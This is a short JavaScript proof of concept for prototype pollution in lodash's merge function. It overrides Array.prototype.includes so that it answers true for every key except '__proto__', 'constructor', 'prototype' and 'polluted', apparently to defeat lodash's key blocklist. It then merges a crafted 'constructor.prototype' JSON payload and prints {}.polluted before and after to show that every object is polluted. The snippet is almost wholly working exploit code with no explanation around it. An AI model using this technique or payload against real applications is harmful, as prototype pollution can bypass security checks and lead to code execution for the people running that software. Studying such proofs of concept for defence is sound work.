Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const _ = require('lodash');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
console.log({}.polluted);
_.merge({}, payload);
console.log({}.polluted);